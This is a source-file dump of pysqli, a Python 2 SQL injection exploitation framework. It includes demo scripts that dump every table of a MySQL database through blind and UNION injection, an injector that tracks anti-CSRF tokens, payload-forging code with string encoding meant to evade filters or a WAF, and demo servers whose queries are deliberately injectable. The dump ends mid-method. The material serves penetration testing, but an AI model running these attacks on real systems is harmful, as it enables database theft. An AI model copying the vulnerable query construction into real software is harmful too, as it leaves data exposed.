__FILENAME__ = cmd_target
import sys
from MySQLdb import *
from MySQLdb.cursors import DictCursor

try:
    db = connect('localhost','demo','demo',db='demo', cursorclass=DictCursor)
    c = db.cursor()
    c.execute('SELECT * FROM demo WHERE id=%s'%sys.argv[1])
    res = c.fetchall()
    if c.rowcount==1:
        print res[0]
        sys.exit(0)
    else:
        print 'Article inexistant'
        sys.exit(2)
    db.close()
except Exception,e:
    print e
    print 'Erreur inconnue'
    sys.exit(3)

########NEW FILE########
__FILENAME__ = demo_cmd
from pysqli import BlindContext, Mysql5

# define SQLi injection context
c = BlindContext(
    field_type=BlindContext.FIELD_INT,
    params=[
        '/usr/bin/python',
        'cmd_target.py',
        '2',
    ],
	target=2,
)

# we are injecting into a Mysql5 DBMS
m = Mysql5.cmd(c)

# display DB version and dump all tables' content
print 'DB Version: %s' % m.version()
for table in m.database().tables():
    print '='*80 +'\n%s\n'%table.describe() + '='*80
    for row in table.all():
        print row

########NEW FILE########
__FILENAME__ = csrf
import re
from pysqli import Context
from pysqli.dbms import Mysql5
from pysqli.core.injector import PostInjector
from pysqli.core.triggers import RegexpTrigger, Trigger
from urllib2 import Request,urlopen
from threading import Lock 

class CSRFPostInjector(PostInjector):
    '''
    This is a sample of an injector able to track anti-CSRF tokens.

    This injector must use Lock to ensure token integrity between
    a call to process_injection() and process_response().
    '''
    def __init__(self, context):
        PostInjector.__init__(self, context)
        self._lock = Lock()
        self.get_token_sid()
        self.set_trigger(RegexpTrigger(['(inexistant)'],mode=Trigger.MODE_ERROR))
        self.get_context().set_cookie('PHPSESSID=%s;' % self._sid)
    
    def get_token_sid(self):
        '''
        Extract a valid token and the corresponding PHPSESSID.
        '''
        r = Request(self.get_context().get_url())
        resp = urlopen(r)
        content = resp.read()
        self._token = re.search('name="token" value="([^"]+)"', content).group(1)
        self._sid = re.search('PHPSESSID=([0-9a-zA-Z]+);', resp.headers['set-cookie']).group(1)

    def inject(self, sql):
        print sql
        return super(CSRFPostInjector, self).inject(sql)

    def process_injection(self, parameters):
        '''
        Injection hook. 
        
        Acquire the lock, inject token into tampered parameters, and forward to parent.
        '''
        self._lock.acquire()
        parameters['token'] = self._token
        return super(CSRFPostInjector, self).process_injection(parameters)

    def process_response(self, response):
        '''
        Process response

        Extract token, release the lock.
        '''
        self._token = re.search('name="token" value="([^"]+)"', response.get_content()).group(1)
        res = super(CSRFPostInjector, self).process_response(response)
        self._lock.release()
        #print response.get_content()
        print res
        return res

# Injection context as discovered manually
c = Context(
	method='blind',
	comment='#',
	field_type=Context.FIELD_INT,
	url="http://127.0.0.1/",
    params={
        'id':'1',
        'token':'',
    },
	target='id',
)

# DBMS abstraction
m = Mysql5.custom(CSRFPostInjector,c)

print '[i] Version: %s' % m.get_int("LENGTH('test')")

"""
for db in m.databases():
    if str(db) not in ['information_schema','mysql']:
        print '=> %s' % db
        for table in db.tables():
            print '---> %s' % table
            for field in table.fields():
                print '      + %s' % field

for table in m.database().tables():
    print 'Dump %s ...' % table
    for row in table.all():
        print row
"""

########NEW FILE########
__FILENAME__ = client
import sys
import xmlrpclib

proxy = xmlrpclib.ServerProxy("http://localhost:8000/")

res = proxy.get_article(sys.argv[1])
print res

########NEW FILE########
__FILENAME__ = demo_xml
import xmlrpclib
from pysqli import Mysql5, BlindContext
from pysqli.core.injector import ContextBasedInjector

class XmlRpcInjector(ContextBasedInjector):
    def __init__(self, context, server, port):
        super(XmlRpcInjector, self).__init__(context)
        self.proxy = xmlrpclib.ServerProxy("http://localhost:8000/")

    def process_injection(self, parameters):
        '''
        Target arg is 'id'
        '''
        res = self.proxy.get_article(parameters['id'])
        return (res != '')

c = BlindContext(
        params = {
            'id':'1',
        },
        field_type=BlindContext.FIELD_INT,
        default='1',
        target='id',
        multithread=False
)

m = Mysql5.custom(XmlRpcInjector, c, 'localhost',8000)
print m.version()
for table in m.database().tables():
    print 'Dumping %s ...' % table
    for row in table.all():
        print row


########NEW FILE########
__FILENAME__ = server
import sys
import xmlrpclib
from SimpleXMLRPCServer import SimpleXMLRPCServer
from MySQLdb import *
from MySQLdb.cursors import DictCursor

def get_article(id):
    try:
        db = connect('localhost','demo','demo',db='demo', cursorclass=DictCursor)
        c = db.cursor()
        c.execute('SELECT * FROM demo WHERE id=%s'%id)
        res = c.fetchall()
        if c.rowcount==1:
            return str(res[0])
        else:
            return ''
        db.close()
    except Exception,e:
        print e
        print 'Erreur inconnue'
        return ''

server = SimpleXMLRPCServer(("localhost", 8000))
print "Listening on port 8000..."
server.register_function(get_article, "get_article")
server.serve_forever()


########NEW FILE########
__FILENAME__ = async
#-*- coding:utf-8 -*-

"""
This module handles every asynchronous request.

Classes:
    OptimizedAsyncBisecInjector
    AsyncBisecInjector
    AsyncInjector
    AsyncPool
"""

from threading import Thread

class OptimizedAsyncBisecInjector(Thread):
    """ Optimized asynchronous bisection-based injector
        
    This injector uses an improved bisection to speed up the
    injection.

    The main idea behind this improved method is simple:
    using Python's multithreading, 3 parallelized requests take approx.
    the same time to run than 2 requests (statistically). This can be
    used to speed up the classic bisection approach by not testing a single
    value but 3 at a time. Given the results, the search interval is divided.
    by 4 instead of 2. 12 requests are required instead of 8 to complete the
    search, the same as 6 successive requests instead of 8. 
    """

    def __init__(self, db, cdt, min, max):
        Thread.__init__(self)
        self.db = db
        self.result = None
        self.min = min
        self.max = max
        self.cdt = cdt
        self.pool = AsyncPool(self.db)
        
    
    def run(self):
        while (self.max-self.min)>1:
            # create another async pool
            self.pool.clear_tasks()
              
            # compute the 3 mids
            mid = (self.max-self.min)/2 + self.min
            mid_l = (mid-self.min)/2 + self.min
            mid_r = (self.max-mid)/2 + mid
              
            self.pool.add_task(self.db.forge.wrap_bisec(self.db.forge.forge_cdt(self.cdt,mid)))
            self.pool.add_task(self.db.forge.wrap_bisec(self.db.forge.forge_cdt(self.cdt,mid_l)))
            self.pool.add_task(self.db.forge.wrap_bisec(self.db.forge.forge_cdt(self.cdt,mid_r)))
             
            self.pool.solve_tasks()
    
            if self.pool.result[0] is False:
                if self.pool.result[2] is False:
                    self.min = mid_r
                else:
                    self.min = mid
                    self.max = mid_r
            else:
                if self.pool.result[1] is False:
                    self.min = mid_l
                    self.max = mid
                else:
                    self.max = mid_l
        self.result = self.min


class AsyncBisecInjector(Thread):
    """
    Classic asynchronous bisection injector
    """
    
    def __init__(self, db, cdt, min, max):
        Thread.__init__(self)
        self.db = db
        self.result = None
        self.min = min
        self.max = max
        self.cdt = cdt

    def run(self):
        while (self.max-self.min)>1:
            mid = (self.max-self.min)/2 + self.min
            if self.db.injector.inject(self.db.forge.wrap_bisec(self.db.forge.forge_cdt(self.cdt,mid))):
                self.max = mid
            else:
                self.min = mid
        self.result = self.min


class AsyncInjector(Thread):
    
    """
    Asynchronous wrapper
    """

    def __init__(self, db, sql):
        Thread.__init__(self)
        self.db = db
        self.sql = sql
        self.result = None
        self.error = False

    def run(self):
        try:
            self.result = self.db.injector.inject(self.sql)
        except Exception, e:
            print e
            self.error = True


class AsyncPool:
    
    """
    Pool of asynchronous tasks.
    
    This class handles a set of requests, send them through the injector and
    group the results.
    """

    def __init__(self, db,limit=5):
        self.db = db
        self.limit = limit
        self.clear_tasks()
    
    
    def add_bisec_task(self, cdt, min, max):
        """
        Enqueue a bisection task to the pool
        """
        self.tasks.append(OptimizedAsyncBisecInjector(self.db, cdt, min, max))

    def add_classic_bisec_task(self, cdt, min, max):
        """
        Enqueue a 'classic' bisection injection
        """
        self.tasks.append(AsyncBisecInjector(self.db, cdt, min, max))
    
    def add_task(self, sql):
        """
        Enqueue a basic task 
        """
        self.tasks.append(AsyncInjector(self.db,sql))

    def clear_tasks(self):
        """
        Clear all tasks
        """
        self.tasks = []
        self.result = []

    def solve_tasks(self):
        """
        Launch all tasks and grab results
        """
        done = 0
        stop = 0
        for task in self.tasks:
            stop+=1
            try:
                task.start()
                if stop==self.limit:
                    for t in range(stop):
                        task = self.tasks[t+done]
                        task.join()
                        self.result.append(task.result)
                        del task
                    done += stop
                    stop=0
            except Exception:
                print 'Unable to launch thread #%d' % (stop+done)

        if stop>0:
            for t in range(stop):
                task = self.tasks[t+done]
                task.join()
                self.result.append(task.result)
                del task
                            
    def get_str_result(self):
        """
        Pack the result as a string
        """
        res = ''
        for r in self.result:
            res += '%c' % r
        return res
 

########NEW FILE########
__FILENAME__ = context
#-*- coding: utf-8 -*-

"""
This module contains the following classes:
    
    Context
    InbandContext
    BlindContext
    
A context represents a set of conditions required to perform correctly
an SQL injection. 

"""

from random import choice

class Context:
    """
    Context class
    
    This class is used to store every info related to the injection context.
    """

    FIELD_STR = 'string'
    FIELD_INT = 'int'
    INBAND = 'inband'
    BLIND = 'blind'

    def __init__(self, method=INBAND, field_type=FIELD_STR, url='',
                 params=None, target=None, comment='/*', strdelim="'", union_tag=None,
                 union_fields=(), default='0', union_target=-1, use_ssl=False,
                 smooth=False, headers=None, cookie=None, multithread=True,
                 truncate=False, encode_str=False):
        '''
        Default injection context constructor.
        '''

        # injection method
        self.__method = method
        self.__url = url
        self.__params = params
        self.__target = target
        self.__comment = comment
        self.__str_delim = strdelim
        self.__default = default
        self.__use_ssl = use_ssl
        self.__encode_str = encode_str
        self.__truncate = truncate
        self.__field_type = field_type
        self.__smooth = smooth
        self.__headers = headers
        self.__cookie = cookie
        self.__multithread = multithread

        # inband specific 
        self.__union_fields = union_fields
        self.__union_target = union_target
        if union_tag is not None:
            self.__union_tag = union_tag
        else:
            self.__union_tag = ''.join([choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(32)])

    def get_url(self):
        """
        Returns the target URL
        """
        return self.__url


    def set_url(self, url):
        """
        Set the target URL
        """
        self.__url = url

    ## Set vulnerable field type
    # @param field_type Field type, must be either FIELD_STR or FIELD_INT

    def set_field_type(self, field_type):
        """
        Set field type (FIELD_INT or FIELD_STR)
        """
        self.__field_type = field_type

    ## Get vulnerable field type
    # @return Vulnerable field type (FIELD_INT or FIELD_STR)

    def get_field_type(self):
        """
        Get field type (FIELD_INT or FIELD_STR)
        """
        return self.__field_type

    ## Enable SQL string encvoding
    # Enable SQL string encoding to evade anti-quote functions or WAF

    def enable_string_encoding(self, enabled):
        """
        Enable/disable string encoding.
        """
        self.__encode_str = enabled

    ## Enable SQL query truncation
    # If enabled, comment out the rest of the SQL query

    def enable_truncate(self, enabled):
        """
        Enable/disable request truncate.
        """
        self.__truncate = enabled

    ## Check if context asks for query truncating        
    # @return True if query truncation is enabled, False otherwise    
    def require_truncate(self):
        """
        Retrieve request truncation requirement.
        """
        return self.__truncate

    ## Check if string encoding is required        
    # @return True if string encoding is required, False otherwise

    def require_string_encoding(self):
        """
        Determine if string encoding is required or not.
        """
        return self.__encode_str

        ## Enable SSL support

        # @param enabled True to enable, False to disable

    def enable_ssl(self, enabled):
        """
        Enable/disable SSL support.
        """
        self.__use_ssl = enabled

    ## Check if SSL is required
    # @return True if SSL is required, False otherwise

    def use_ssl(self):
        """
        Return True if SSL must be used, False otherwise.
        """
        return self.__use_ssl


    def set_smooth(self, enabled=True):
        """
        Enable/disable smooth mode
        """
        self.__smooth = enabled

    def is_smooth(self):
        """
        Determine if smooth must be used or not.
        """
        return self.__smooth

    def set_multithread(self, enabled=True):
        """
        Enable/disable multithreading.
        """
        self.__multithread = enabled

    def is_multithread(self):
        """
        Determine if multithreading must be used or not.
        """
        return self.__multithread

    def has_headers(self):
        """
        Determine if extra headers must be used
        """
        return self.__headers is not None

    def set_headers(self, headers):
        """
        Set extra headers.Headers
        
        headers: dict of extra headers (mostly HTTP)
        """
        self.__headers = headers

    def set_header(self, header, value):
        """
        Set a given header
        
        header: header name (string)
        value: header value (usually, string)
        """
        if self.__headers is not None:
            self.__headers[header] = value
        else:
            self.__headers = {header: value}

    def get_headers(self):
        """
        Get all headers
        """
        return self.__headers

    def set_cookie(self, cookie):
        """
        Set HTTP cookie.
        
        cookie: cookie value. 
        """
        self.__cookie = cookie

    def get_cookie(self):
        """
        Get cookie.
        """
        return self.__cookie

    def set_params(self, params, target=None):
        """
        Set parameters and target parameter.
        
        params: dict of parameters
        target: target parameter
        """
        self.__params = params
        self.__target = target

    def get_params(self):
        """
        Retrieve parameters.
        """
        return self.__params

    def get_target_param(self):
        """
        Retrieve the target parameter
        """
        return self.__target

    def get_comment(self):
        """
        Get comment sequence
        """
        return self.__comment

    def set_comment(self, comment):
        """
        Set comment seqence
        """
        self.__comment = comment

    def get_string_delimiter(self):
        """
        Retrieve string delimiter
        """
        return self.__str_delim

    def set_string_delimiter(self, delim):
        """
        Set string delimiter
        
        delim: string delimiter
        """
        self.__str_delim = delim

    def set_default_value(self, default):
        """
        Set default value to use in the SQL code
        
        default: default value (string in case of FIELD_STR,
                    int in case of FIELD_INT)
        """
        self.__default = default

    def get_default_value(self):
        """
        Retrieve default value
        """
        return self.__default

    def set_inband_fields(self, fields):
        """
        Set inband fields
        
        Inband fields are quite special: they are described with a single string
        with these possible caracters:
            - s: specify a string field
            - i: specify an integer field
        
        This is used to be compliant with Oracle, Mssql, and other DBMS. 
        
        Example:
            
            context.set_inband_fields('sssisi')
        
        declares 6 fields, [string, string, string, integer, string, integer]
        """
        self.__union_fields = fields

    def get_inband_fields(self):
        """
        Retrieve inband fields types
        """
        return self.__union_fields

    def get_inband_tag(self):
        """
        Get inband tag
        
        The inband tag is a string used to wrap the extracted string in order
        to extract it easily. This tag is randomly generated when an instance
        of the Context class is created.
        """
        return self.__union_tag

    def set_inband_target(self, target):
        """
        Sets inband target field index
        """
        self.__union_target = int(target)

    def get_inband_target(self):
        """
        Retrieve inband target field index
        """
        return self.__union_target

    def is_blind(self):
        """
        Determines if the actual injection context is blind
        """
        return (self.__method == Context.BLIND)

    def is_inband(self):
        """
        Determines if the actual injection context is inband
        """
        return (self.__method == Context.INBAND)

    def in_string(self):
        """
        Determines if the target field is a string
        """
        return (self.__field_type == Context.FIELD_STR)

    def in_int(self):
        """
        Determines if the target field is an int
        """
        return (self.__field_type == Context.FIELD_INT)

    def use_blind(self):
        """
        Switch to blind injection
        """
        self.__method = Context.BLIND

    def use_inband(self):
        """
        Switch to inband injection
        """
        self.__method = Context.INBAND


class InbandContext(Context):
    """
    Inband injection context
    """

    def __init__(self, **kwargs):
        kwargs['method'] = Context.INBAND
        Context.__init__(self, **kwargs)


class BlindContext(Context):
    """
    Blind injection context
    """

    def __init__(self, **kwargs):
        kwargs['method'] = Context.BLIND
        Context.__init__(self, **kwargs)

########NEW FILE########
__FILENAME__ = dbms
#-*- coding: utf-8 -*-

from injector import GetInjector, PostInjector, CookieInjector, \
    UserAgentInjector, CmdInjector
from context import Context
from exceptions import OutboundException, PluginMustOverride, Unavailable
from async import AsyncPool
from wrappers import DatabaseWrapper, TableWrapper, FieldWrapper

DBS_ENUM = 0x01
TABLES_ENUM = 0x02
COLS_ENUM = 0x04
FIELDS_ENUM = 0x08
STR = 0x10
COMMENT = 0x20

class DBMSFactory:
    """
    DBMS factory.
    
    Set up a DBMS plugin with a specific injector.
    """

    def __init__(self, plugin_class, name, desc):
        self._clazz = plugin_class
        self._name = name
        self._desc = desc

    def get(self, context=Context(), limit_max_count=500):
        """
        Factor a GetInjector and set up the plugin
        """
        inst = self._clazz(GetInjector(context), limit_max_count)
        inst.name = self._name
        inst.desc = self._desc
        return inst

    def post(self, context=Context(), limit_max_count=500):
        """
        Factor a PostInjector and set up the plugin
        """
        inst = self._clazz(PostInjector(context), limit_max_count)
        inst.name = self._name
        inst.desc = self._desc
        return inst

    def user_agent(self, method, context=Context(), limit_max_count=500):
        """
        Factor a UserAgentInjector and set up the plugin
        """
        inst = self._clazz(UserAgentInjector(method, context), limit_max_count)
        inst.name = self._name
        inst.desc = self._desc
        return inst

    def cookie(self, method='GET', context=Context(), limit_max_count=500, data=None, content_type=None):
        """
        Factor a CookieInjector and set up the plugin
        """
        inst = self._clazz(CookieInjector(method, context, data, content_type), limit_max_count)
        inst.name = self._name
        inst.desc = self._desc
        return inst

    def cmd(self, context=Context(), limit_max_count=500):
        """
        Factor a CmdInjector and set up the plugin
        """
        inst = self._clazz(CmdInjector(context), limit_max_count)
        inst.name = self._name
        inst.desc = self._desc
        return inst

    def custom(self, injector, *args, **kwargs):
        """
        Factor a custom injector and set up the plugin
        """
        if 'limit_max_count' in kwargs:
            limit_max_count = kwargs['limit_max_count']
            del kwargs['limit_max_count']
        else:
            limit_max_count = 500
        inst = self._clazz(injector(*args, **kwargs), limit_max_count)
        inst.name = self._name
        inst.desc = self._desc
        return inst


class dbms:
    """
    Class decorator for DBMS

    Use it to declare a class as a DBMS plugin. 
    """

    def __init__(self, name, desc):
        """
        Constructor.
        
        name: dbms name
        desc: dbms description
        """
        self.name = name
        self.desc = desc

    def __call__(self, inst):
        return DBMSFactory(inst, self.name, self.desc)


class allow:
    """
    Plugin decorator
    
    Set the plugin capabilities.
    """


    def __init__(self, flags):
        self.flags = flags

    def __call__(self, inst):
        def wrapped_(*args):
            a = inst(*args)
            if hasattr(a, 'capabilities'):
                a.capabilities |= self.flags
            else:
                a.capabilities = self.flags
            return a

        return wrapped_


class DBMS:
    """
    DBMS default class

    This class implements an abstraction of the underlying DBMS. It
    provides methods to perform databases and tables enumeration as
    well as data extraction.

    This abstraction allows the user to focus on the data he wants
    to get rather than the injected code.

    """

    def __init__(self, forge, injector=None, limit_count_max=500):
        """
        Constructor.
        
        forge: forge class to use
        injector: injector instance to use
        limit_count_max: maximum number of records
        """
        self.forge_class = forge
        self.context = injector.get_context()
        self.forge = forge(self.context)
        self.injector = injector
        self.limit_count_max = limit_count_max
        self.current_db = None
        self.current_user = None


    def has_cap(self, cap):
        """
        Determine if the plugin has a given capability.
        
        Capability must be part of [DBS_ENUM, TABLES_ENUM, COLS_ENUM,
        FIELDS_ENUM, STR, COMMENT]
        """
        return (self.capabilities & cap) == cap

    def determine(self):
        """
        This method must return True if the DBMS can be determined, False otherwise.
        """
        raise PluginMustOverride

    def get_forge(self):
        """
        Retrieve the forge instance
        """
        return self.forge


    def set_injector(self, injector):
        """
        Set injector.
        
        injector: instance of AbstractInjector or its derived classes.
        """
        method = self.injector.getMethod()
        self.injector = injector(self.context, method)

    def  get_injector(self):
        """
        Retrieve the injector
        """
        return self.injector

    def set_forge(self, forge):
        """
        Set SQL forge.
        
        forge: SQL forge to use.
        """
        self.forge_class = forge
        self.forge = forge(self.context)


    def set_trigger(self, trigger):
        """
        Set injector's default trigger

        trigger: the new trigger to use
        """
        self.injector.set_trigger(trigger)


    def use(self, db):
        """
        Select a database.
        
        db: database name (string)
        """
        self.current_db = db
        return DatabaseWrapper(self, self.current_db)

    def apply_bisec(self, cdt, min, max):
        """
        Use SQL bisection to determine an integer value. 
        """
        while (max - min) > 1:
            mid = (max - min) / 2 + min
            if self.injector.inject(self.forge.wrap_bisec(self.forge.forge_cdt(cdt, mid))):
                max = mid
            else:
                min = mid
        return min


    def get_inband_str(self, sql):
        """
        Extract a string through inband SQL injection
        """
        return self.injector.inject(self.forge.wrap_sql(self.forge.forge_second_query(sql)))


    def get_inband_int(self, sql):
        """
        Extract an integer through inband SQL injection
        """
        return int(self.get_inband_str(sql))

    def get_blind_int(self, sql):
        """
        Extract an integer through blind SQL injection
        """
        pool = AsyncPool(self)
        if self.context.is_multithread():
            pool.add_bisec_task(sql, 0, self.limit_count_max)
        else:
            pool.add_classic_bisec_task(sql, 0, self.limit_count_max)
        pool.solve_tasks()
        return pool.result[0]


    def get_char(self, sql, pos):
        """
        Forge SQL to extract a character at a given position
        """
        return self.forge.get_char(sql, pos)

    def get_blind_str(self, sql):
        """
        Extract a string through a blind SQL injection
        """
        size = self.get_blind_int(self.forge.string_len(sql))
        if size == (self.limit_count_max - 1):
            raise OutboundException()
        if self.context.is_multithread():
            pool = AsyncPool(self)
            for p in range(size):
                pool.add_bisec_task(self.forge.ascii(self.forge.get_char(sql, p + 1)), 0, 255)
            pool.solve_tasks()
            return pool.get_str_result()
        else:
            result = ''
            for p in range(size):
                pool = AsyncPool(self)
                pool.add_classic_bisec_task(self.forge.ascii(self.forge.get_char(sql, p + 1)), 0, 255)
                pool.solve_tasks()
                result += pool.get_str_result()
            return result

    def get_int(self, sql):
        """
        Extract an integer.
        
        Supports inband and blind SQL injection. 
        """
        if self.context.is_blind():
            return self.get_blind_int(sql)
        else:
            return self.get_inband_int(sql)

    def get_str(self, sql):
        """
        Extracts a string.
        
        Supports inband and blind SQL injection.
        """
        if self.context.is_blind():
            return self.get_blind_str(sql)
        else:
            return self.get_inband_str(sql)

    def version(self):
        """
        Retrieve the DBMS version string.
        """
        return self.get_str(self.forge.get_version())

    def database(self, db=None):
        """
        Retrieve an instance of DatabaseWrapper.
        
        If db is specified, retrieve the specified database. If not,
        retrieve the current database.
        """
        if db is not None:
            return DatabaseWrapper(self, db)
        else:
            self.current_db = self.get_str(self.forge.get_current_database())
            return DatabaseWrapper(self, self.current_db)

    def get_nb_databases(self):
        """
        Retrieve the number of databases.
        """
        return self.get_int(self.forge.get_nb_databases())

    def get_database_name(self, id):
        """
        Retrieve the database name.
        
        id: index of the databases name (0<id<count)
        """
        return self.get_str(self.forge.get_database_name(id))

    def databases(self):
        """
        Enumerates all existing/accessible databases
        """
        if self.has_cap(DBS_ENUM):
            n = self.get_nb_databases()
            for i in range(n):
                yield DatabaseWrapper(self, self.get_database_name(i))
        else:
            raise Unavailable()


    def get_nb_tables(self, db=None):
        """
        Retrieve the number of tables belonging to a database. If no database
        is specified, use the current database.
        
        db: target database (default: None)
        """
        if db:
            return self.get_int(self.forge.get_nb_tables(db=db))
        else:
            db = self.database()
            return self.get_int(self.forge.get_nb_tables(db=db))

    def get_table_name(self, id, db=None):
        """
        Retrieve a given table's name from a specified DB.
        """
        return self.get_str(self.forge.get_table_name(id, db=db))

    def tables(self, db=None):
        """
        Enumerates all tables fro a given database. If not specified, use the
        current database.
        """
        if self.has_cap(TABLES_ENUM):
            # if db not given, then find the db
            if db is None:
                if self.current_db is None:
                    self.database()
                db = self.current_db

            n = self.get_nb_tables(db)
            for i in range(n):
                yield TableWrapper(self, self.get_table_name(i, db), db)
        else:
            raise Unavailable()

    def get_nb_fields(self, table, db):
        """
        Retrieve the number of fields (columns) from a given table and database.
        """
        return self.get_int(self.forge.get_nb_fields(table, db=db))

    def get_field_name(self, table, id, db):
        """
        Retrieve a given field's name from a given table and database
        """
        return self.get_str(self.forge.get_field_name(table, id, db))

    def fields(self, table, db=None):
        """
        Enumerates all fields from a given table. If a database is specified,
        use it. 
        """
        if self.has_cap(FIELDS_ENUM):
            if db is None:
                if self.current_db is None:
                    self.database()
                db = self.current_db
            n = self.get_nb_fields(table, db)
            for i in range(n):
                yield FieldWrapper(self, table, db, self.get_field_name(table, i, db))
        else:
            raise Unavailable()


    def user(self):
        """
        Retrieve the current DB user.
        """
        return self.get_str(self.forge.get_user())

    def count_table_records(self, table, db=None, max=1000000):
        """
        Count the number of records of a given table. If db is specified, use
        the corresponding database.
        """
        if db is None:
            if self.currrent_db is None:
                self.database()
            db = self.current_db
        return self.get_int(self.forge.count(self.forge.select_all(table, db)))


    def get_record_field_value(self, field, table, pos, db=None):
        """
        Get a record's field value. 
        
        field: field name
        table: table name
        db: database name (default: current DB)
        pos: record index
        """
        if db is None:
            if self.currrent_db is None:
                self.database()
            db = self.current_db
        return self.get_str(self.forge.get_table_field_record(field, table, db, pos))

    def __getitem__(self, i):
        """
        Allows the plugin to act as a dictionary.
        
        i: database index or name.
        """
        if isinstance(i, (int, long)):
            d = self.getDatabaseName(i)
            if d is None:
                raise IndexError
            else:
                return DatabaseWrapper(self, d)
        elif isinstance(i, basestring):
            return DatabaseWrapper(self, i)


    def __len__(self):
        """
        Return the number of databases.
        """
        return self.get_nb_databases()


########NEW FILE########
__FILENAME__ = exceptions
#-*- coding: utf-8 -*-

"""
Exceptions
"""

class OutboundException(Exception):
    """
    Outbound bisection exception.
    
    This exception is raised 
    """
    def __repr__(self):
        return "Dichotomy returned an outbound exception."

class SQLBadURL(Exception):
    """
    Bad URL exception
    """
    def __init__(self):
        Exception.__init__(self)
        
    def __repr__(self):
        return '<SQLBadURL Exception>'

class Unavailable(Exception):
    """
    Feature is unavailable.
    """
    def __init__(self):
        Exception.__init__(self)
        
    def __repr__(self):
        return '<Unavailable Exception>'

class PluginMustOverride(Exception):
    """
    Developer must override
    """
    def __init__(self):
        Exception.__init__(self)
    def __repr__(self):
        return '<PluginMustOverride Exception>'


class SQLInvalidTargetParam(Exception):
    """
    Invalid target parameter
    """
    def __init__(self):
        Exception.__init__(self)
    def __repr__(self):
        return '<SQLInvalidTargetParam Exception>'


class UnknownField(Exception):
    """
    Unknown field specified
    """
    def __init__(self, field_name):
        Exception.__init__(self)
        self._field_name = field_name
    def __repr__(self):
        return '<UnknownField name="%s">' % self._field_name


########NEW FILE########
__FILENAME__ = forge
#-*- coding: utf-8 -*-

class SQLForge:

    """
    SQLForge

    This class is in charge of providing methods to craft SQL queries. Basically,
    the methods already implemented fit with most of the DBMS.
    """

    def __init__(self, context):
        """ Constructor

        context: context to associate the forge with.
        """
        self.context = context

    def wrap_bisec(self, sql):
        """
        Wrap a bisection-based query.

        This method must be overridden to provide a way to use bisection given
        a DBMS. There is no universal way to perform this, so it has to be
        implemented in each DBMS plugin.
        """
        raise NotImplementedError('You must define the wrap_bisec() method')


    def wrap_string(self, string):
        """
        Wraps a string.

        This method encode the given string and/or add delimiters if required.
        """
        if self.context.require_string_encoding():
            out = 'CHAR('
            for car in string:
                out += str(ord(car))+','
            out = out[:-1] + ')'
        else:
            return "%c%s%c" % (self.context.get_string_delimiter(),string,self.context.get_string_delimiter())
        return out


    def wrap_sql(self, sql):
        """
        Wraps SQL query

        This method wraps an SQL query given the specified context.
        """
        q = self.context.get_string_delimiter()
        if self.context.is_blind():
            if self.context.require_truncate():
                if self.context.in_string():
                    return "%c OR (%s=%s) %s" % (q,sql,self.wrap_field(self.context.get_default_value()),self.context.get_comment())
                elif self.context.in_int():
                    return "%s OR (%s)=%s %s" % (self.context.get_default_value(), sql, self.wrap_field(self.context.get_default_value()), self.context.getComment())
            else:
                if self.context.in_string():
                    return "%c OR (%s=%s) AND %c1%c=%c1" % (q,sql,self.wrap_field(self.context.get_default_value()),q,q,q)
                elif self.context.in_int():
                    return "%s OR (%s)=%s " % (self.context.get_default_value(), sql,self.wrap_field(self.context.get_default_value()))
        else:
            if self.context.require_truncate():
                if self.context.in_string():
                    return "%c AND 1=0 UNION %s %s" % (q, sql, self.context.getComment())
                elif self.context.in_int():
                    return "%s AND 1=0 UNION %s %s" % (self.context.get_default_value(), sql, self.context.get_comment())
            else:
                if self.context.in_string():
                    return "%c AND 1=0 UNION %s" % (q, sql)
                elif self.context.in_int():
                    return "%s AND 1=0 UNION %s" % (self.context.get_default_value(), sql)



    def wrap_field(self,field):
        """
        Wrap a field with delimiters if required.
        """
        q = self.context.get_string_delimiter()
        if self.context.in_string():
            return "%c%s%c" % (q,field,q)
        else:
            return "%s"%field

    def wrap_ending_field(self, field):
        """
        Wrap the last field with a delimiter if required.
        """
        q = self.context.get_string_delimiter()
        if self.context.in_string():
            return "%c%s" % (q,field)
        else:
            return "%s"%field


    def string_len(self, string):
        """
        Forge a piece of SQL retrieving the length of a string.
        """
        return "LENGTH(%s)" % string


    def get_char(self, string, pos):
        """
        Forge a piece of SQL returning the n-th character of a string.
        """
        return "SUBSTRING(%s,%d,1)" % (string,pos)


    def concat_str(self, str1, str2):
        """
        Forge a piece of SQL concatenating two strings.
        """
        return "CONCAT(%s,%s)" % (str1, str2)


    def ascii(self, char):
        """
        Forge a piece of SQL returning the ascii code of a character.
        """
        return "ASCII(%s)" % char


    def count(self, records):
        """
        Forge a piece of SQL returning the number of rows from a set of records.
        """
        sql= "(SELECT COUNT(*) FROM (%s) AS T1)" % records
        return sql


    def take(self,records, index):
        """
        Forge a piece of SQL returning the n-th record of a set.
        """
        return "(%s LIMIT %d,1)" % (records, index)


    def select_all(self, table, db):
        """
        Forge a piece of SQL returning all records of a given table.
        """
        return "(SELECT * FROM %s.%s)" % (db, table)


    def get_table_field_record(self, field, table, db, pos):
        """
        Forge a piece of SQL returning one record with one column from a table.
        """
        return "(SELECT %s FROM (SELECT * FROM %s.%s) as t0 LIMIT %d,1)"%(field,db,table,pos)


    def forge_cdt(self, val, cmp):
        """
        Forge a piece of SQL creating a condition.
        """
        return "(%s)<%d" % (val,cmp)


    def forge_second_query(self, sql):
        """
        Basic inband query builder.

        Builds the second part of an inband injection (following the UNION).
        """
        query = 'SELECT '
        columns= []
        fields = self.context.get_inband_fields()
        tag = self.context.get_inband_tag()
        for i in range(len(fields)):
            if i==self.context.get_inband_target():
                columns.append(self.concat_str(self.wrap_string(tag),self.concat_str(sql, self.wrap_string(tag))))
            else:
                if fields[i]=='s':
                    columns.append(self.wrap_string('0'))
                elif fields[i]=='i':
                    columns.append('0')
        return query + ','.join(columns)


    def get_version(self):
        """
        Forge a piece of SQL returning the DBMS version.

        Must be overridden by each DBMS plugin.
        """
        raise NotImplementedError('You must provide the get_version() method.')


    def get_user(self):
        """
        Forge a piece of SQL returning the current username.
        """
        return 'username()'


    def get_current_database(self):
        """
        Forge a piece of SQL returning the current database name.
        """
        return 'database()'


    def get_databases(self):
        """
        Forge a piece of SQL returning all the known databases.
        """
        raise NotImplementedError('You must define the "get_databases" function.')

    def get_database(self, id):
        """
        Forge a piece of SQL returning the name of the id-th database.
        """
        return self.take(self.get_databases(), id)


    def get_nb_databases(self):
        """
        Forge a piece of SQL returning the number of databases.
        """
        return self.count(self.get_databases())



    def get_database_name(self, id):
        """
        Forge a piece of SQL returning the name of id-th database.
        """
        return self.take(self.get_databases(),id)


    def get_tables(self,db):
        """
